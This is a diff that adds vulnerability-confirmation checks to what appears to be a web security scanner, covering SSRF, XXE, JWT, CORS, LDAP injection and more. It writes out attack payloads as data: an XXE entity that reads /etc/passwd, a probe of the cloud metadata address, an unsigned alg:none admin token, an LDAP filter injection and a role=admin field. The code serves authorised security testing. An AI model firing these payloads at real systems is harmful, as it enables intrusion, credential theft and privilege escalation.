@@ -2,11 +2,13 @@
 by hypothesis class without a hardcoded branch (Open/Closed)."""
 from __future__ import annotations
 
+import base64
+import json
 import re
 import secrets
 from dataclasses import dataclass, field
 from pathlib import Path
-from urllib.parse import urlencode
+from urllib.parse import urlencode, urlparse
 
 from tools.httpx import Session, save_evidence
 
@@ -333,4 +335,388 @@ def check_ssti(session, hyp, ev_dir, ctx):
         return CheckResult("false-positive", endpoint, files=files,
                            false_positive_reason="template payload reflected literally or "
                                                  "encoded, not evaluated as an expression")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+_REDIRECT_CODES = {301, 302, 303, 307, 308}
+
+
+@register("OPEN-REDIRECT", "OPEN_REDIRECT")
+def check_open_redirect(session, hyp, ev_dir, ctx):
+    """Open redirect: a destination parameter sends the browser to an attacker-controlled
+    host. The client never follows the 3xx (allow_redirects=False), so the Location header
+    is read without leaving scope; the marker host (.example) is never contacted."""
+    endpoint, param = hyp["endpoint"], hyp["parameter"]
+    method = hyp.get("method", "GET").upper()
+    marker = "evil-" + secrets.token_hex(3) + ".example"
+    payloads = [f"https://{marker}/hb", f"//{marker}/hb"]
+
+    def send(value):
+        if method == "POST":
+            return session.post(endpoint, data={param: value}, allow_redirects=False)
+        return session.get(endpoint + "?" + urlencode({param: value}), allow_redirects=False)
+
+    files, saw_redirect, last = [], False, None
+    for i, payload in enumerate(payloads):
+        resp = send(payload)
+        last = resp
+        files += save_evidence(ev_dir, f"redirect-probe-{i}", resp)
+        location = next((v for k, v in resp.headers.items() if k.lower() == "location"), "")
+        if resp.status in _REDIRECT_CODES:
+            saw_redirect = True
+            host = urlparse(location).netloc or urlparse("//" + location.lstrip("/")).netloc
+            if host == marker:
+                return CheckResult("confirmed", endpoint, "medium", f"{param}={payload}",
+                                   f"Redirect sent to attacker-controlled host "
+                                   f"(Location: {location}).", files=files)
+
+    if saw_redirect:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="redirect destination validated or confined "
+                                                 "to the same site (no off-site Location)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+# Distinctive strings a cloud instance-metadata endpoint returns; strong SSRF signal.
+_METADATA_MARKERS = ("iam/security-credentials", "ami-id", "instance-id")
+
+
+@register("SSRF")
+def check_ssrf(session, hyp, ev_dir, ctx):
+    """Server-side request forgery: the server fetches a URL the client supplies. Probe the
+    cloud instance-metadata address; confirm when its distinctive content comes back,
+    absent from a benign external control. The scanner's client only ever talks to the
+    in-scope target — the metadata address is a string in the parameter, never contacted
+    by us."""
+    endpoint, param = hyp["endpoint"], hyp["parameter"]
+    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
+
+    control = send("https://example.com/")
+    probe = send("http://169.254.169.254/latest/meta-data/")
+    files = save_evidence(ev_dir, "control-external", control)
+    files += save_evidence(ev_dir, "probe-metadata", probe)
+
+    hit = [m for m in _METADATA_MARKERS if m in probe.body and m not in control.body]
+    if hit:
+        return CheckResult("confirmed", endpoint, "high",
+                           f"{param}=http://169.254.169.254/latest/meta-data/",
+                           f"Server fetched the cloud metadata endpoint; response carried "
+                           f"internal-only content ({', '.join(hit)}).", files=files)
+    if probe.status in (400, 403) and control.status == 200:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="internal/link-local address blocked while "
+                                                 "an external URL is allowed")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("CORS")
+def check_cors(session, hyp, ev_dir, ctx):
+    """CORS misconfiguration: the endpoint reflects an arbitrary Origin into
+    Access-Control-Allow-Origin, letting any site read the response. Worst with
+    Access-Control-Allow-Credentials: true, which exposes authenticated data."""
+    endpoint = hyp["endpoint"]
+    marker = "https://evil-" + secrets.token_hex(3) + ".example"
+    resp = session.get(endpoint, headers={"Origin": marker})
+    files = save_evidence(ev_dir, "cors-probe", resp)
+    acao = next((v for k, v in resp.headers.items()
+                 if k.lower() == "access-control-allow-origin"), "")
+    acac = next((v for k, v in resp.headers.items()
+                 if k.lower() == "access-control-allow-credentials"), "").lower()
+
+    if acao == marker or (acao == "*" and acac == "true"):
+        with_creds = acac == "true"
+        detail = ("reflected the attacker Origin" if acao == marker
+                  else "served a wildcard origin")
+        return CheckResult(
+            "confirmed", endpoint, "high" if with_creds else "medium", f"Origin: {marker}",
+            f"Access-Control-Allow-Origin {detail}" +
+            (" with Access-Control-Allow-Credentials: true (authenticated cross-origin "
+             "reads)." if with_creds else " (cross-origin reads allowed)."), files=files)
+    if acao:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason=f"Access-Control-Allow-Origin is fixed "
+                                                 f"({acao}), not reflected")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+_XXE_DOC = ('<?xml version="1.0"?>\n'
+            '<!DOCTYPE root [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>\n'
+            '<root>&{ent};</root>')
+
+
+@register("XXE")
+def check_xxe(session, hyp, ev_dir, ctx):
+    """XML external entity injection: a parser resolves an external SYSTEM entity, pulling a
+    local file into the response. Confirm by referencing /etc/passwd; a benign control (same
+    doc, no entity) must not leak it. One read-only file reference is proof."""
+    endpoint = hyp["endpoint"]
+    ent = "hb" + secrets.token_hex(3)
+    headers = {"Content-Type": "application/xml"}
+
+    control = session.post(endpoint, raw="<?xml version=\"1.0\"?><root>ok</root>",
+                           headers=headers)
+    inject = session.post(endpoint, raw=_XXE_DOC.format(ent=ent), headers=headers)
+    files = save_evidence(ev_dir, "control-noentity", control)
+    files += save_evidence(ev_dir, "inject-xxe", inject)
+
+    if _PASSWD.search(inject.body) and not _PASSWD.search(control.body):
+        return CheckResult("confirmed", endpoint, "high",
+                           'SYSTEM "file:///etc/passwd"',
+                           "External entity resolved to /etc/passwd (root:...:0:0: present), "
+                           "absent from the entity-free control.", files=files)
+    if f"&{ent};" in inject.body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="external entities are not resolved "
+                                                 "(reference returned unexpanded)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("HOST-HEADER", "HOST_HEADER")
+def check_host_header(session, hyp, ev_dir, ctx):
+    """Host header injection: the app builds an absolute URL (e.g. a password-reset link)
+    from the attacker-controlled Host header. Confirm by sending a marker Host and finding
+    it reflected into the response, where it was not with the real Host."""
+    endpoint = hyp["endpoint"]
+    marker = "evil-" + secrets.token_hex(3) + ".example"
+
+    control = session.get(endpoint)
+    inject = session.get(endpoint, headers={"Host": marker})
+    files = save_evidence(ev_dir, "control-host", control)
+    files += save_evidence(ev_dir, "inject-host", inject)
+
+    if marker in inject.body and marker not in control.body:
+        return CheckResult("confirmed", endpoint, "medium", f"Host: {marker}",
+                           f"The request Host header was reflected into the response "
+                           f"({marker}), so a generated link can be pointed at an attacker "
+                           "host.", files=files)
+    if control.status == 200 and marker not in inject.body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="response uses a fixed canonical host, not "
+                                                 "the request Host header")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("CSRF")
+def check_csrf(session, hyp, ev_dir, ctx):
+    """CSRF: a state-changing request is accepted with no unpredictable anti-CSRF token, so
+    another site can forge it using the victim's cookies. Confirm by submitting the change
+    without any token; a rejection (token required) is a false positive."""
+    endpoint = hyp["endpoint"]
+    param = hyp.get("parameter") or "email"
+    marker = "hb" + secrets.token_hex(3) + "@evil.example"
+
+    resp = session.post(endpoint, data={param: marker})  # deliberately no CSRF token
+    files = save_evidence(ev_dir, "no-token", resp)
+    body = (resp.body or "").lower()
+
+    if resp.status == 200 and marker in (resp.body or ""):
+        return CheckResult("confirmed", endpoint, "medium", f"POST {param}={marker} (no token)",
+                           "State change was accepted without any anti-CSRF token, so it can "
+                           "be forged cross-site using the victim's session.", files=files)
+    if resp.status in (400, 403) or "csrf" in body or "token" in body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="request without a CSRF token was rejected "
+                                                 "(anti-CSRF protection present)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("CLICKJACKING")
+def check_clickjacking(session, hyp, ev_dir, ctx):
+    """Clickjacking: an HTML page served with neither X-Frame-Options nor a CSP
+    frame-ancestors directive can be framed by any site and overlaid for UI redress."""
+    endpoint = hyp["endpoint"]
+    resp = session.get(endpoint)
+    files = save_evidence(ev_dir, "frame-headers", resp)
+    hdrs = {k.lower(): v for k, v in resp.headers.items()}
+    is_html = "html" in hdrs.get("content-type", "").lower()
+    csp = hdrs.get("content-security-policy", "").lower()
+    framed_denied = bool(hdrs.get("x-frame-options")) or "frame-ancestors" in csp
+
+    if resp.status == 200 and is_html and not framed_denied:
+        return CheckResult("confirmed", endpoint, "low", "no X-Frame-Options / frame-ancestors",
+                           "HTML page served without X-Frame-Options or a CSP frame-ancestors "
+                           "directive, so any site can frame it (clickjacking).", files=files)
+    if framed_denied:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="X-Frame-Options or CSP frame-ancestors is "
+                                                 "set (framing denied)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("GRAPHQL", "GRAPHQL-INTROSPECTION")
+def check_graphql(session, hyp, ev_dir, ctx):
+    """GraphQL introspection: the endpoint answers an introspection query, disclosing the
+    full schema (types, fields, mutations) to anyone — useful recon for an attacker."""
+    endpoint = hyp["endpoint"]
+    resp = session.post(endpoint, json_body={"query": "{__schema{queryType{name} types{name}}}"})
+    files = save_evidence(ev_dir, "introspection", resp)
+    body = resp.body or ""
+
+    if resp.status == 200 and "__schema" in body:
+        return CheckResult("confirmed", endpoint, "low", "{__schema{types{name}}}",
+                           "GraphQL introspection is enabled; the full schema is disclosed.",
+                           files=files)
+    if "introspection" in body.lower() or resp.status in (400, 403):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="introspection is disabled or rejected")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+def _jwt_segment(obj):
+    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()
+
+
+@register("JWT")
+def check_jwt(session, hyp, ev_dir, ctx):
+    """JWT alg:none: a forged token with header {"alg":"none"} and no signature is accepted,
+    letting an attacker assert any identity. Confirm by claiming 'administrator' with an
+    unsigned token; a rejection is a false positive."""
+    endpoint = hyp["endpoint"]
+    forged = (_jwt_segment({"alg": "none", "typ": "JWT"}) + "." +
+              _jwt_segment({"user": "administrator", "role": "admin"}) + ".")
+    resp = session.get(endpoint, headers={"Authorization": f"Bearer {forged}"})
+    files = save_evidence(ev_dir, "alg-none", resp)
+    body = resp.body or ""
+
+    if resp.status == 200 and "administrator" in body:
+        return CheckResult("confirmed", endpoint, "high", f"Bearer {forged}",
+                           "An unsigned alg:none token asserting 'administrator' was "
+                           "accepted; identity can be forged without the signing key.",
+                           files=files)
+    if resp.status in (401, 403):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="unsigned (alg:none) token was rejected")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+_TRACE_RE = re.compile(
+    r"Traceback \(most recent call last\)|File \"[^\"]+\", line \d+|"
+    r"\bat [\w.$]+\([\w.$]+\.\w+:\d+\)|Exception in thread|"
+    r"(?:Fatal error|Warning|Notice):.*on line \d+|org\.\w+(?:\.\w+)+Exception", re.I)
+
+
+@register("INFO-DISCLOSURE", "INFO_DISCLOSURE")
+def check_info_disclosure(session, hyp, ev_dir, ctx):
+    """Verbose errors: malformed input makes the server return a stack trace or framework
+    error, disclosing internals. Confirm by sending junk and matching a trace signature."""
+    endpoint, param = hyp["endpoint"], hyp.get("parameter") or "n"
+    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
+
+    control = send("1")
+    bad = send("'\"`<xyz>@%zz")
+    files = save_evidence(ev_dir, "control", control)
+    files += save_evidence(ev_dir, "malformed", bad)
+
+    if _TRACE_RE.search(bad.body) and not _TRACE_RE.search(control.body):
+        return CheckResult("confirmed", endpoint, "medium", f"{param}=malformed",
+                           "Malformed input returned a stack trace / framework error "
+                           "disclosing server internals.", files=files)
+    if bad.status in (400, 422) and not _TRACE_RE.search(bad.body):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="malformed input returned a generic error "
+                                                 "with no server internals")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("DIR-LISTING", "DIR_LISTING", "DIRECTORY-LISTING")
+def check_dir_listing(session, hyp, ev_dir, ctx):
+    """Directory listing: a directory path returns an auto-generated index of its files."""
+    endpoint = hyp["endpoint"]
+    resp = session.get(endpoint)
+    files = save_evidence(ev_dir, "listing", resp)
+    if resp.status == 200 and re.search(r"Index of /|Directory listing for|<title>\s*Index of",
+                                        resp.body, re.I):
+        return CheckResult("confirmed", endpoint, "low", f"GET {endpoint}",
+                           "Directory index is exposed (auto-generated file listing).",
+                           files=files)
+    if resp.status in (401, 403, 404):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason=f"directory access returned {resp.status} "
+                                                 "(listing not exposed)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("LDAPI", "LDAP", "LDAP-INJECTION")
+def check_ldapi(session, hyp, ev_dir, ctx):
+    """LDAP injection: filter metacharacters injected into an LDAP query change its logic
+    (e.g. a wildcard/always-true clause returns records a benign lookup does not)."""
+    endpoint, param = hyp["endpoint"], hyp.get("parameter") or "user"
+    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
+    control = send("nobody-" + secrets.token_hex(3))
+    inject = send("*)(uid=*))(|(uid=*")
+    files = save_evidence(ev_dir, "control", control)
+    files += save_evidence(ev_dir, "inject-ldap", inject)
+
+    if inject.status == 200 and len(inject.body) > len(control.body) + 2:
+        return CheckResult("confirmed", endpoint, "high", f"{param}=*)(uid=*))(|(uid=*",
+                           "An LDAP filter injection returned records the benign lookup did "
+                           "not (filter logic altered).", files=files)
+    if len(inject.body) <= len(control.body):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="LDAP metacharacters appear escaped "
+                                                 "(no extra records returned)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("MASS-ASSIGNMENT", "MASS_ASSIGNMENT")
+def check_mass_assignment(session, hyp, ev_dir, ctx):
+    """Mass assignment: the endpoint binds a privileged field (role) from the request body
+    that a client should not control, escalating privilege."""
+    endpoint = hyp["endpoint"]
+    marker = "hb" + secrets.token_hex(3)
+    resp = session.post(endpoint, data={"name": marker, "role": "admin"})
+    files = save_evidence(ev_dir, "inject-role", resp)
+    data = resp.json()
+
+    if resp.status == 200 and isinstance(data, dict) and data.get("role") == "admin":
+        return CheckResult("confirmed", endpoint, "high", "role=admin (unexpected field)",
+                           "The server bound a privileged 'role' field from the request body "
+                           "(mass assignment / privilege escalation).", files=files)
+    if isinstance(data, dict) and "role" in data and data.get("role") != "admin":
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason=f"privileged field ignored (role stayed "
+                                                 f"'{data.get('role')}')")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("USER-ENUM", "USER_ENUM")
+def check_user_enum(session, hyp, ev_dir, ctx):
+    """Username enumeration: the login response differs for a valid vs an invalid username,
+    letting an attacker learn which accounts exist."""
+    endpoint = hyp["endpoint"]
+    pw = "wrong-" + secrets.token_hex(3)
+    valid = session.post(endpoint, data={"username": ctx.actor, "password": pw})
+    invalid = session.post(endpoint,
+                           data={"username": "nouser-" + secrets.token_hex(4), "password": pw})
+    files = save_evidence(ev_dir, "valid-username", valid)
+    files += save_evidence(ev_dir, "invalid-username", invalid)
+
+    if valid.status != invalid.status or (valid.body or "") != (invalid.body or ""):
+        return CheckResult("confirmed", endpoint, "medium",
+                           f"username={ctx.actor} vs a random username",
+                           "The login response differs for a valid versus an invalid "
+                           "username, disclosing which accounts exist.", files=files)
+    return CheckResult("false-positive", endpoint, files=files,
+                       false_positive_reason="identical response for valid and invalid "
+                                             "usernames (no oracle)")
+
+
+@register("PROTO-POLLUTION", "PROTOTYPE-POLLUTION", "PROTO_POLLUTION")
+def check_proto_pollution(session, hyp, ev_dir, ctx):
+    """Prototype pollution: a JSON-merge endpoint honors a __proto__ key, letting attacker
+    data land on the object prototype."""
+    endpoint = hyp["endpoint"]
+    marker = "hb" + secrets.token_hex(3)
+    resp = session.post(endpoint, json_body={"__proto__": {"hbflag": marker}})
+    files = save_evidence(ev_dir, "proto-merge", resp)
+    body = resp.body or ""
+
+    if marker in body:
+        return CheckResult("confirmed", endpoint, "high", '{"__proto__":{"hbflag":"..."}}',
+                           "A __proto__ key from the request body polluted the merged object "
+                           "(prototype pollution).", files=files)
+    if resp.status == 200:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="__proto__ key did not pollute the object "
+                                                 "(stripped or ignored)")
     return CheckResult("unconfirmed", endpoint, files=files)
